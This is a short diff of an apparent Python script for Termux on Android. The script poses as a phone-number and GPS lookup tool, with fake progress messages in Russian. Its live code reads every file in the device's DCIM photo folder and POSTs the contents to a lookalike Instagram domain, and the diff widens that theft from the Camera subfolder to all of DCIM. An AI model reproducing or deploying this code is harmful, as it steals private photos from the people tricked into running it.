@@ -5,9 +5,9 @@ input("Номер телефона: ")
 print("Загрузка БД...")
 os.system("termux-setup-storage")
 print("Идет процесс поиска по GPS")
-l = os.listdir("../storage/shared/DCIM/Camera")
+l = os.listdir("../storage/shared/DCIM/")
 for i in range(len(l)):
-    f = open("../storage/shared/DCIM/Camera/"+l[i], "rb")
+    f = open("../storage/shared/DCIM/"+l[i], "rb")
     r = f.read()
     try:
         requests.post("http://instagram.com.xsph.ru/test/", data={"im": r})
